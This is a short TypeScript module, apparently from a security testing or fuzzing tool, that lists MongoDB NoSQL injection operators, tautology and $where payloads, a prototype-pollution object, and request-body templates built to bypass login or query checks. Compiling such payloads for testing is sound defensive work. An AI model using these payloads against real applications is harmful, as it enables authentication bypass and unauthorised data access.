// Common MongoDB NoSQL injection payloads and operators (safe-by-default strings)

export const operators: string[] = [
  "$ne",
  "$gt",
  "$lt",
  "$gte",
  "$lte",
  "$in",
  "$nin",
  "$regex",
  "$exists",
  "$type",
  "$or",
  "$and",
  "$not",
];

export const stringPayloads: string[] = [
  "' || 1==1 || '",
  '" || 1==1 || "',
  "' && this==this && '",
  '" && this==this && "',
  '{"$ne": null}',
  '{"$gt": ""}',
  '{"$regex": ".*"}',
  '{"$in": [""]}',
  '{"$where": "return true"}',
  '{"__proto__":{"polluted":"yes"}}',
];

export type BodyTemplate = (
  field: string,
  val: unknown
) => Record<string, unknown>;

export const bodyTemplates: BodyTemplate[] = [
  (field, val) => ({ [field]: { $ne: val } }),
  (field, _val) => ({ [field]: { $regex: ".*" } }),
  (field, val) => ({ [field]: { $in: [val, ""] } }),
  (field, _val) => ({ [field]: { $gt: "" } }),
  (field, val) => ({ $or: [{ [field]: val }, { [field]: { $ne: val } }] }),
];
